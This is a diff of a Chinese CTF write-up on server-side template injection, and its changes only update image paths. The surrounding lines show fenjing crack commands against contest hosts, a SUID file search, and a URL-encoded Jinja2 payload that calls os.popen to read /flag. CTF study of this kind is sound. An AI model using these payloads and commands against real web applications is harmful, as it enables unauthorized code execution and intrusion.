@@ -123,15 +123,15 @@ python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000
 python -m fenjing webui
 ```
 
-![image-20251125220436707](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20251125220436707.png)
+![image-20251125220436707](./assets/image-20251125220436707.png)
 
-![image-20251125220600099](D:\下载\Typora\note\aurora\assets\image-20251125220600099.png)
+![image-20251125220600099](./assets/image-20251125220600099.png)
 
 基本觉得ssti注入点
 
 再检验一下
 
-![image-20251125221018289](D:\下载\Typora\note\aurora\assets\image-20251125221018289.png)
+![image-20251125221018289](./assets/image-20251125221018289.png)
 
 回显49,确认为ssti注入
 
@@ -143,13 +143,13 @@ python -m fenjing webui
 python -m fenjing webui
 ```
 
-![image-20251125220825192](D:\下载\Typora\note\aurora\assets\image-20251125220825192.png)
+![image-20251125220825192](./assets/image-20251125220825192.png)
 
 按照要求填写好
 
 `目标链接`:接收请求的地址，可以通过抓包获取，也可以直接查看网络
 
-![image-20251125221123579](D:\下载\Typora\note\aurora\assets\image-20251125221123579.png)
+![image-20251125221123579](./assets/image-20251125221123579.png)
 
 这里可以看到是./ssti
 
@@ -167,7 +167,7 @@ python -m fenjing webui
 
 然后开始分析
 
-![image-20251125221812217](D:\下载\Typora\note\aurora\assets\image-20251125221812217.png)
+![image-20251125221812217](./assets/image-20251125221812217.png)
 
 可以看到，已经绕过了，在下面执行命令
 
@@ -179,7 +179,7 @@ ls /
 cat /flag
 ```
 
-![image-20251125221943158](D:\下载\Typora\note\aurora\assets\image-20251125221943158.png)
+![image-20251125221943158](./assets/image-20251125221943158.png)
 
 ###  导入作为库使用
 
@@ -503,7 +503,7 @@ find / -perm -4000 -type f 2>/dev/null | grep -vE "/proc|/sys"
 %7B%7B%28%28g.pop%5B%27_%27%27_globals__%27%5D.__builtins__%5B%27__i%27%27mport__%27%5D%28%27os%27%29%29.popen%28%27%2Fusr%2Flocal%2Fbin%2Fenv+cat+%2Fflag%27%29%29.read%28%29%7D%7D%7B%23%23%7D
 ```
 
-![image-20251121112253300](D:\下载\Typora\note\aurora\assets\image-20251121112253300.png)
+![image-20251121112253300](./assets/image-20251121112253300.png)
 
 拿到flag
 
@@ -511,7 +511,7 @@ find / -perm -4000 -type f 2>/dev/null | grep -vE "/proc|/sys"
 
 以我们学校新生赛的一道ssti为例
 
-![image-20251125223751454](D:\blog\mizuki\src\content\posts\assets\image-20251125223751454.png)
+![image-20251125223751454](.\assets\image-20251125223751454.png)
 
 上传{{7*7}}的base64编码
 
@@ -521,11 +521,11 @@ e3s3Kjd9fQ==
 
 回显49，存在ssti漏洞
 
-![image-20251125224251895](D:\blog\mizuki\src\content\posts\assets\image-20251125224251895.png)
+![image-20251125224251895](.\assets\image-20251125224251895.png)
 
 抓包，表单是`quote`
 
-![image-20251125225953027](D:\blog\mizuki\src\content\posts\assets\image-20251125225953027.png)
+![image-20251125225953027](.\assets\image-20251125225953027.png)
 
 在kali下载fenjing，输入指令
 
@@ -535,7 +535,7 @@ python -m fenjing crack --url 'http://node.szu.moe:10296/' --method POST --input
 
 爆破成功后就可以执行命令了
 
-![image-20251125230314736](D:\blog\mizuki\src\content\posts\assets\image-20251125230314736.png)
+![image-20251125230314736](.\assets\image-20251125230314736.png)
 
 然后就可以执行命令了
 
@@ -553,7 +553,7 @@ cat /flag
 env
 ```
 
-![image-20251125230542004](D:\blog\mizuki\src\content\posts\assets\image-20251125230542004.png)
+![image-20251125230542004](.\assets\image-20251125230542004.png)
 
 找到flag
 
